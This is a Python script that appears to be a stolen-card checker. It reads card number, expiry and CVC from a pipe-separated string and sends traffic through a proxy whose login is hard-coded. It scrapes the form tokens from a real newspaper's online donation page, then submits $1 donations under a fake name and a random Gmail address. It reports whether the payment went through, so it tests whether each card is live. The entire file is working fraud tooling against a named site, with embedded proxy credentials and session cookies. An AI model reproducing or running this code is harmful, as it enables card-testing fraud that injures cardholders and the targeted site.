import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	cookies = {
	    'PHPSESSID': '8d4271f730828c38126887621f',
	    '_gid': 'GA1.2.1801300810.1753098048',
	    '__gads': 'ID=3a35bebf8fc46d0e:T=1753098049:RT=1753098049:S=ALNI_Maf5xxGL2ubmkSca7R7XLDOOd6sBg',
	    '__gpi': 'UID=0000116b5aeadc65:T=1753098049:RT=1753098049:S=ALNI_MZ6pylpSe39njuIXqA81ciMltlaIQ',
	    '__eoi': 'ID=940f04586d978014:T=1753098049:RT=1753098049:S=AA-AfjZOXRf7qeJOES8pOPmJ5StE',
	    'logglytrackingsession': '6970d140-4cfb-413e-8656-9c64f0f774cf',
	    '_ga': 'GA1.2.1248467344.1753098046',
	    '_gat_UA-40344309-1': '1',
	    '_ga_YX8FXYN204': 'GS2.1.s1753098046$o1$g1$t1753098192$j56$l0$h0',
	}
	
	headers = {
	    'authority': 'www.thecharlottepost.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    # 'cookie': 'PHPSESSID=8d4271f730828c38126887621f; _gid=GA1.2.1801300810.1753098048; __gads=ID=3a35bebf8fc46d0e:T=1753098049:RT=1753098049:S=ALNI_Maf5xxGL2ubmkSca7R7XLDOOd6sBg; __gpi=UID=0000116b5aeadc65:T=1753098049:RT=1753098049:S=ALNI_MZ6pylpSe39njuIXqA81ciMltlaIQ; __eoi=ID=940f04586d978014:T=1753098049:RT=1753098049:S=AA-AfjZOXRf7qeJOES8pOPmJ5StE; logglytrackingsession=6970d140-4cfb-413e-8656-9c64f0f774cf; _ga=GA1.2.1248467344.1753098046; _gat_UA-40344309-1=1; _ga_YX8FXYN204=GS2.1.s1753098046$o1$g1$t1753098192$j56$l0$h0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'submenu': 'Donate',
	    'src': 'forms',
	    'ref': 'Donation_ribbon',
	}
	
	response = session.get('https://www.thecharlottepost.com/index.php', params=params, cookies=cookies, headers=headers)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '8d4271f730828c38126887621f',
	    '_ga': 'GA1.2.1248467344.1753098046',
	    '_gid': 'GA1.2.1801300810.1753098048',
	    '__gads': 'ID=3a35bebf8fc46d0e:T=1753098049:RT=1753098049:S=ALNI_Maf5xxGL2ubmkSca7R7XLDOOd6sBg',
	    '__gpi': 'UID=0000116b5aeadc65:T=1753098049:RT=1753098049:S=ALNI_MZ6pylpSe39njuIXqA81ciMltlaIQ',
	    '__eoi': 'ID=940f04586d978014:T=1753098049:RT=1753098049:S=AA-AfjZOXRf7qeJOES8pOPmJ5StE',
	    'logglytrackingsession': '6970d140-4cfb-413e-8656-9c64f0f774cf',
	    '_ga_YX8FXYN204': 'GS2.1.s1753098046$o1$g1$t1753098110$j60$l0$h0',
	}
	
	headers = {
	    'authority': 'www.thecharlottepost.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'PHPSESSID=8d4271f730828c38126887621f; _ga=GA1.2.1248467344.1753098046; _gid=GA1.2.1801300810.1753098048; __gads=ID=3a35bebf8fc46d0e:T=1753098049:RT=1753098049:S=ALNI_Maf5xxGL2ubmkSca7R7XLDOOd6sBg; __gpi=UID=0000116b5aeadc65:T=1753098049:RT=1753098049:S=ALNI_MZ6pylpSe39njuIXqA81ciMltlaIQ; __eoi=ID=940f04586d978014:T=1753098049:RT=1753098049:S=AA-AfjZOXRf7qeJOES8pOPmJ5StE; logglytrackingsession=6970d140-4cfb-413e-8656-9c64f0f774cf; _ga_YX8FXYN204=GS2.1.s1753098046$o1$g1$t1753098110$j60$l0$h0',
	    'origin': 'https://www.thecharlottepost.com',
	    'referer': 'https://www.thecharlottepost.com/index.php?submenu=Donate&src=forms&ref=Donation_ribbon',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'formProcessed': 'Donation_ribbon',
	}
	
	data = {
	    'formField_First_Name': 'Rodam',
	    'formField_Last_Name': 'User',
	    'formField_donation_amount': 'other',
	    'formField_other_amount': '1',
	    'formPayment_owner': 'Rodam User',
	    'formPayment_card': f'{card_type}',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': '{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
	    'formPayment_method': 'Credit Card',
	    'formPayment_total_payment': '1',
	    'formPayment_gateway': '',
	    'hash': f'{hash}',
	    'csrfToken': f'{tok}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'Donation_ribbon',
	    'fs_id': 'Donation_ribbon',
	    'submenu': 'Donate',
	}
	
	response = session.post('https://www.thecharlottepost.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'<span style="color: #008000;">(.*?) <\/span>', response.text).group(1)
		
	return (result)
